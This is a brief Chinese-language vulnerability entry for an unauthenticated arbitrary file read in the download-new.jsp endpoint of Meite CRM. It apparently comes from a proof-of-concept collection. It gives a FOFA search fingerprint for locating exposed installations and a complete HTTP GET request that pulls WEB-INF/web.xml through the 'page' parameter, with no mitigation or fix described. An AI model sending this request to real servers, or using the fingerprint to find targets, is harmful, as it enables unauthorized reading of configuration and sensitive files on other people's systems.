## 美特CRM-download-new.jsp-任意文件读取漏洞

## 一、漏洞简介
01漏洞概述
美特CRM download-new.jsp 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。

## fofa
```
body="/common/scripts/basic.js"
```

## POC
```
GET /business/common/download-new.jsp?filename=&page=WEB-INF/web.xml HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept-Encoding: gzip
```
